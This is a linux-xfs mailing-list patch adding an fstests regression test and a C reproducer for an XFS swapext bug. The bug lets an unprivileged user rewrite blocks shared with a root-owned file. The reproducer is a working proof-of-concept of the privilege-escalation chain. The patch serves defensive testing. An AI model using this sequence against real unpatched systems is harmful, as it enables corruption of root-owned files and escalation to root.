Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE3343B8D7B
	for <linux-xfs@vger.kernel.org>; Wed,  7 Oct 2026 17:05:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791392710; cv=none; b=DvR5cozmBVKanwaFxWn9nAlUouKDh2CZTlDQIOQSjxCkATfu1Fxh/pMdqVmP2Xv9yDQP3qXgkIZhmmzyLg0GMTZNKR7FdnJoRFwB1dcN+Uy0pxgqppmYAsSE+S5NQA0QvBfOJ9CqhzeX32FDkG7eCzVp6eJp/oETrEagh3tZ28s=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791392710; c=relaxed/simple;
	bh=g5z6pqZWkRinwe5wdrYemYbOmQ+xdPB0dYeJ5tsXYWQ=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=gx6SvTExUUAoSFXiMy5lwY0r65pENE9CSMYzySyrQOlnXM8HiWz/eUIPfqwh9LJEWiBS1Fd4+eppxaJ/vsrQqddWrp8TmyIKZjt7ZwzhUz92JkvDfruPHR7Z2zYX8YpN/Bix+4OBIZqUqTROZcKNhCFQ/enr5S8xd5cNeUFPRVM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=AQuBndPZ; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="AQuBndPZ"
Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id 37B8A1F000FF;
	Wed,  7 Oct 2026 17:05:08 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1791392708;
	bh=Akk4lRkEi0N6UfjSFZcl3d0bwXrCbdEIlaeMHU6WgeE=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To;
	b=AQuBndPZRwoWYolq24q6QPumCbzvW9PmpW4UO93YeX/TYxijumXuCD5+YgtPGTlKc
	 f7b3l4s0jY9NUTJ3eC+odWzghwoQoKqhaN+c/G9D4G5xaSWY7gIbBqIWcksljYEKXR
	 6PGP86KxMHgGtFU+6s0DwpGelBMADziROt4FdZnGkQkS5hA4cnV370mCcmZ+y707c6
	 yMlSnXRpchiuz2SQybG2q0tTgIZLIsXgCRl6uvYgFTLSoZlb3j9Ji1yoUNDuXCaZi+
	 aP26zkpzQYdMC4v1kjhMBE7Zxka517r78atdDTNBjkecnz7iJXwtrmEQ/p3nkHbf/D
	 7xmZgkZH9UDxg==
Date: Wed, 7 Oct 2026 10:05:07 -0700
From: "Darrick J. Wong" <djwong@kernel.org>
To: Zorro Lang <zlang@kernel.org>
Cc: Carlos Maiolino <cem@kernel.org>, Norbert Szetei <norbert@doyensec.com>,
	linux-xfs@vger.kernel.org, Christoph Hellwig <hch@infradead.org>
Subject: [PATCH] xfs: add regression test for swapext reflux
Message-ID: <20261007170507.GJ2705364@frogsfrogsfrogs>
References: <20261007170227.GH2705364@frogsfrogsfrogs>
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20261007170227.GH2705364@frogsfrogsfrogs>

From: Darrick J. Wong <djwong@kernel.org>

This is a regression test for a bug that Norbert Szetei reported in the
XFS swapext ioctl.  I've ported his reproducer program to fstests so
that everyone can run it.

Cc: Norbert Szetei <norbert@doyensec.com>
Signed-off-by: "Darrick J. Wong" <djwong@kernel.org>
---
 src/Makefile              |    2 
 src/xfs-swapext-reflink.c |  230 +++++++++++++++++++++++++++++++++++++++++++++
 tests/xfs/1939            |   69 ++++++++++++++
 tests/xfs/1939.out        |    2 
 4 files changed, 302 insertions(+), 1 deletion(-)
 create mode 100644 src/xfs-swapext-reflink.c
 create mode 100755 tests/xfs/1939
 create mode 100644 tests/xfs/1939.out

diff --git a/src/Makefile b/src/Makefile
index 211b16a832ad5d..eaf0621fc4b876 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -37,7 +37,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
 	detached_mounts_propagation ext4_resize t_readdir_3 splice2pipe \
 	uuid_ioctl t_snapshot_deleted_subvolume fiemap-fault min_dio_alignment \
 	rw_hint btrfs_ioctl refluxfs xfs-exchange-to-eof \
-	xfs-exchange-to-dirty-eof
+	xfs-exchange-to-dirty-eof xfs-swapext-reflink
 
 EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
 	      btrfs_crc32c_forged_name.py popdir.pl popattr.py \
diff --git a/src/xfs-swapext-reflink.c b/src/xfs-swapext-reflink.c
new file mode 100644
index 00000000000000..e2a240d5a0af91
--- /dev/null
+++ b/src/xfs-swapext-reflink.c
@@ -0,0 +1,230 @@
+// SPDX-License-Identifier: GPL-2.0
+
+// Trick swapext into screwing up the file reflink flags after data exchange
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/vfs.h>
+#include <linux/fs.h>
+#include <linux/fiemap.h>
+
+#ifndef FICLONERANGE
+#define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
+#endif
+
+#ifndef XFS_EXCHANGE_RANGE_TO_EOF
+struct xfs_exchange_range {
+	__s32		file1_fd;
+	__u32		pad;
+	__u64		file1_offset;
+	__u64		file2_offset;
+	__u64		length;
+	__u64		flags;
+};
+#define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
+#define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
+#endif
+
+#ifndef XFS_IOC_SWAPEXT
+typedef struct xfs_bstime {
+	long		tv_sec;
+	__s32		tv_nsec;
+} xfs_bstime_t;
+
+struct xfs_bstat {
+	__u64		bs_ino;
+	__u16		bs_mode;
+	__u16		bs_nlink;
+	__u32		bs_uid;
+	__u32		bs_gid;
+	__u32		bs_rdev;
+	__s32		bs_blksize;
+	__s64		bs_size;
+	xfs_bstime_t	bs_atime;
+	xfs_bstime_t	bs_mtime;
+	xfs_bstime_t	bs_ctime;
+	__s64		bs_blocks;
+	__u32		bs_xflags;
+	__s32		bs_extsize;
+	__s32		bs_extents;
+	__u32		bs_gen;
+	__u16		bs_projid_lo;
+	__u16		bs_forkoff;
+	__u16		bs_projid_hi;
+	__u16		bs_sick;
+	__u16		bs_checked;
+	unsigned char	bs_pad[2];
+	__u32		bs_cowextsize;
+	__u32		bs_dmevmask;
+	__u16		bs_dmstate;
+	__u16		bs_aextents;
+};
+
+struct xfs_swapext {
+	__s64			sx_version;
+#define XFS_SX_VERSION		0
+	__s64			sx_fdtarget;
+	__s64			sx_fdtmp;
+	__s64			sx_offset;
+	__s64			sx_length;
+	char			sx_pad[16];
+	struct xfs_bstat	sx_stat;
+};
+#define XFS_IOC_SWAPEXT		_IOWR('X', 109, struct xfs_swapext)
+#endif
+
+static unsigned long blksz;
+static int peer, f1;
+
+static unsigned long long phys(int fd, unsigned long long off)
+{
+	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
+
+	memset(&q, 0, sizeof q);
+	q.f.fm_start = off;
+	q.f.fm_length = blksz;
+	q.f.fm_extent_count = 1;
+	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
+		return 0;
+	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
+}
+
+static void show(const char *tag)
+{
+	struct stat st;
+	int i;
+
+	fstat(f1, &st);
+	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, phys(peer, 0),
+	       (long long)st.st_size);
+	for (i = 0; i < 3; i++)
+		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
+		       i == 2 ? "]\n" : "] [");
+}
+
+static int mkfile(const char *name, char fill, int blocks)
+{
+	char *buf;
+	int fd;
+
+	unlink(name);
+	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
+	if (fd < 0)
+		return fprintf(stderr, "open %s: %m\n", name), -1;
+	buf = malloc(blocks * blksz);
+	memset(buf, fill, blocks * blksz);
+	if (pwrite(fd, buf, blocks * blksz, 0) != (ssize_t)(blocks * blksz))
+		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
+	free(buf);
+	fsync(fd);
+	return fd;
+}
+
+int main(int argc, char *argv[])
+{
+	struct xfs_exchange_range xr;
+	struct file_clone_range cr;
+	struct xfs_swapext sx;
+	char before[65536], after[65536], *buf;
+	struct statfs sfs;
+	struct stat st;
+	int d1, d2;
+
+	if (argc != 3) {
+		fprintf(stderr, "Usage: $0 dir path_to_peer\n");
+		return 2;
+	}
+
+	if (chdir(argv[1]))
+		return perror(argv[1]), 2;
+
+	if (statfs(".", &sfs))
+		return fprintf(stderr, "statfs: %m\n"), 2;
+	blksz = sfs.f_bsize;
+
+	peer = open(argv[2], O_RDONLY);
+	if (peer < 0)
+		return fprintf(stderr, "open peer: %m\n"), 2;
+	fstat(peer, &st);
+	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
+	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
+	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "read peer: %m\n"), 2;
+	syncfs(peer);	/* so FIEMAP reports peer's real block */
+
+	f1 = mkfile("file1", 'A', 3);
+	d1 = mkfile("donor1", 'B', 1);
+	d2 = mkfile("donor2", 'C', 1);
+	if (f1 < 0 || d1 < 0 || d2 < 0)
+		return 2;
+	show("start");
+
+	/* 1. share peer's block into the middle of file1 */
+	cr = (struct file_clone_range){ .src_fd = peer, .src_offset = 0,
+					.src_length = blksz,
+					.dest_offset = blksz };
+	if (ioctl(f1, FICLONERANGE, &cr))
+		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
+	show("1 FICLONERANGE");
+
+	/*
+	 * 2. exchange file1's last block against the whole of donor1 with
+	 * TO_EOF.  The sizes are exchanged too, so file1 claims one block
+	 * while still owning three.  file2_offset is block 2, so this exchange
+	 * cannot clear a reflink flag.
+	 */
+	xr = (struct xfs_exchange_range){ .file1_fd = d1, .file1_offset = 0,
+					  .file2_offset = 2 * blksz,
+					  .length = 0,
+					  .flags = XFS_EXCHANGE_RANGE_TO_EOF };
+	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), 2;
+	show("2 EXCHANGE_RANGE TO_EOF");
+
+	/*
+	 * 3. XFS_IOC_SWAPEXT with file1 as the target.  sx_offset is 0 and
+	 * sx_length equals both inodes' i_disk_size, so the "Verify all data
+	 * are being swapped" test passes.  xfs_swap_extent_rmap() then bounds
+	 * its remap loop with XFS_B_TO_FSB(mp, i_size_read(VFS_I(ip))), which
+	 * is one block, so file1's two mappings above its size are left in
+	 * place -- and the reflink flags are swapped anyway, clearing file1's.
+	 */
+	fsync(f1);
+	fsync(d2);
+	if (fstat(f1, &st))
+		return fprintf(stderr, "fstat file1: %m\n"), 2;
+	memset(&sx, 0, sizeof sx);
+	sx.sx_version		= XFS_SX_VERSION;
+	sx.sx_fdtarget		= f1;
+	sx.sx_fdtmp		= d2;
+	sx.sx_offset		= 0;
+	sx.sx_length		= st.st_size;
+	sx.sx_stat.bs_mtime.tv_sec  = st.st_mtim.tv_sec;
+	sx.sx_stat.bs_mtime.tv_nsec = st.st_mtim.tv_nsec;
+	sx.sx_stat.bs_ctime.tv_sec  = st.st_ctim.tv_sec;
+	sx.sx_stat.bs_ctime.tv_nsec = st.st_ctim.tv_nsec;
+	if (ioctl(f1, XFS_IOC_SWAPEXT, &sx))
+		return fprintf(stderr, "SWAPEXT: %m\n"), 2;
+	show("3 SWAPEXT");
+
+	/* 4. write to the block file1 still shares with peer */
+	buf = malloc(blksz);
+	memset(buf, 'X', blksz);
+	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
+		return fprintf(stderr, "pwrite: %m\n"), 2;
+	fsync(f1);
+	show("4 pwrite(file1, 4096)");
+
+	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
+	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "re-read peer: %m\n"), 2;
+	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
+	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
+	return memcmp(before, after, blksz) ? 0 : 1;
+}
+
+
diff --git a/tests/xfs/1939 b/tests/xfs/1939
new file mode 100755
index 00000000000000..b08ea09e977628
--- /dev/null
+++ b/tests/xfs/1939
@@ -0,0 +1,69 @@
+#! /bin/bash
+# SPDX-License-Identifier: GPL-2.0
+# Copyright (c) 2026 Oracle.  All Rights Reserved.
+#
+# FS QA Test No. 1939
+#
+# Regression test for an swapext bug which unintentionally results in files
+# that share data blocks but don't have the reflink flag set.  This enables
+# attackers to rewrite shared blocks to gain root privileges, similar to
+# refluxfs.
+. ./common/preamble
+_begin_fstest auto quick swapext
+
+. ./common/filter
+. ./common/reflink
+
+_require_test_program "xfs-swapext-reflink"
+_require_user fsgqa
+_require_group fsgqa
+_require_scratch_reflink
+_require_xfs_scratch_rmapbt
+_require_cp_reflink
+
+_fixed_by_fs_commit xfs XXXXXXXXXXXXXX \
+	"xfs: stop exchanging reflink flags when exchanging mappings"
+
+_scratch_mkfs >> $seqres.full
+_scratch_mount
+
+rootdir=$SCRATCH_MNT/root
+userdir1=$SCRATCH_MNT/user1
+blksz=$(_get_file_block_size $SCRATCH_MNT)
+
+# Fill $mnt/peer with "P", run reproducer program
+mkdir -p $rootdir $userdir1
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer.copy >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer1 >> $seqres.full
+sync
+
+chown $qa_user:$qa_group $userdir1
+chmod +r $rootdir/peer1
+
+_su $qa_user -c "$here/src/xfs-swapext-reflink $userdir1 $rootdir/peer1" &> $tmp.out1
+
+echo "Errors from reproducer:" >> $seqres.full
+cat $tmp.out1 >> $seqres.full
+
+# Check for file corruption
+grep -q REWRITTEN $tmp.out1 && \
+	echo "$rootdir/peer1 rewritten, filesystem corrupt!"
+
+cmp -s $rootdir/peer.copy $rootdir/peer1 || \
+	echo "$rootdir/peer1 changed since its snapshot, filesystem corrupt!"
+
+# Check reflink flags
+_scratch_unmount
+_scratch_xfs_db \
+	-c "path /user1/file1" -c 'print' \
+	| grep v3.reflink
+_scratch_mount
+
+# Check for file corruption now that we've blown away all caches
+grep -q REWRITTEN $tmp.out1 && \
+	echo "$rootdir/peer1 rewritten, filesystem corrupt!"
+
+cmp -s $rootdir/peer.copy $rootdir/peer1 || \
+	echo "$rootdir/peer1 changed since its snapshot, filesystem corrupt!"
+
+_exit 0
diff --git a/tests/xfs/1939.out b/tests/xfs/1939.out
new file mode 100644
index 00000000000000..ad52293f986ac6
--- /dev/null
+++ b/tests/xfs/1939.out
@@ -0,0 +1,2 @@
+QA output created by 1939
+v3.reflink = 1
